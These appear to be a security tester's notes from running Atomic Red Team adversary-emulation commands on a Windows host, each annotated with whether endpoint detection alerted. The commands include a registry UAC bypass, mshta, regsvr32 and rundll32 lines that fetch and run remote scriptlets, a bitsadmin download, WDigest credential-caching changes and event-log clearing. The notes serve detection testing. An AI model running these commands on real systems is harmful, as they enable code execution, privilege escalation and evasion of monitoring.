BITS Jobs

bitsadmin.exe /transfer /Download /priority Foreground 	https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\JJ21TSO\Desktop\bitsadmin_flag.ps1


UAC Bypass
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.msc" (DID ATP LOG AND ALERT ON BCBS SIDE? NOT ALWERT ON OUR END)
Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore (Ran AFter The Fact)

CMSTP
cmstp.exe /s https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/src/T1191.inf
cmstp.exe /s https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/src/T1191_uacbypass.inf /au

CMSTP
cmstp.exe /s https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/src/T1191.inf
cmstp.exe /s https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1191/src/T1191_uacbypass.inf /au
(No Alert)

compile after delivery csc
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:T1500.exe C:\Users\JJ21TSO\Desktop\calc.cs
(No Alert)

Compiled HTML Help Remote Payload
C:\>(No Alert)hh.exe C:\Users\JJ21TSO\Desktop\T1223.chm
(No Alert)

Control Panel Items 
control.exe calc.cpl
(No Alert)

DLL Search Order Hijacking - amsi.dll - ran, but no powershell prompt was launched 
copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
%APPDATA%\updater.exe -Command exit
del %APPDATA%\updater.exe >nul 2>&1
del %APPDATA%\amsi.dll >nul 2>&1
(WORKING ON)

certutil -encode C:\Windows\System32\calc.exe C:\Users\JJ21TSO\Desktop\T1140_calc.txt
certutil -decode C:\Users\JJ21TSO\Desktop\T1140_calc.txt C:\Users\JJ21TSO\Desktop\T1140_calc_decoded.exe
del C:\Users\JJ21TSO\Desktop\T1140_calc.txt >nul 2>&1
del C:\Users\JJ21TSO\Desktop\T1140_calc_decoded.exe >nul 2>&1
(No ALert)

Hidden Window
Start-Process powershell.exe -WindowStyle hidden calc.exe
(No Alert)

Clear Logs
wevtutil cl System
(No Alert, Access Denied)

Indirect Command Execution - pcalua.exe
pcalua.exe -a calc.exe
pcalua.exe -a C:\Windows\System32\calc.exe
(No Alert)

Masquerading as Windows LSASS process

copy %SystemRoot%\System32\cmd.exe C:\Users\JJ21TSO\Desktop\lsass.exe
C:\Users\JJ21TSO\Desktop\lsass.exe /B
del /Q /F C:\Users\JJ21TSO\Desktop\lsass.exe >nul 2>&1
(No Alert, But recieved a memory error)

Modify Registry of Current User Profile
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /f >nul 2>&1
(No Alert)

modify credentials - access denied
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1
(No Alert)

Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct')).Exec();close();
(Alert and blocked)

mshta hta file
$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta"
$var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta"
remove-item "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1170.hta" -ErrorAction Ignore
(No Alert)

Execute base64-encoded PowerShell
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
(No Alert)

svchost writing a file to a UNC path
copy C:\Windows\System32\cmd.exe C:\Users\JJ21TSO\Desktop\svchost.exe
C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
del C:\T1055.txt >nul 2>&1
del C:\svchost.exe >nul 2>&1
(No Alert, But recieved a memory error)

Regasm Uninstall Method Call Test
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"C:\Users\JJ21TSO\Desktop\T1121.dll" /target:library T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\Users\JJ21TSO\Desktop\T1121.dll
del C:\Users\JJ21TSO\Desktop\\T1121.dll >nul 2>&1Re
(No Alert)

Regsvr32 remote COM scriptlet execution
regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll
(Alert and blocked)

Rundll32 execute JavaScript Remote Payload With GetObject
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();
(Alert and blocked)

MSBuild Bypass Using Inline Tasks
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.csproj
(No Alert)

Reach out to C2 Pointer URLs via command_prompt
bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ C:\Users\JJ21TSO\Desktop\bitsadmindownload.html
del %TEMP%\bitsadmindownload.html >nul 2>&1C2
(No Alert)

WMIC bypass using remote XSL file
wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
(Alert and blocked)

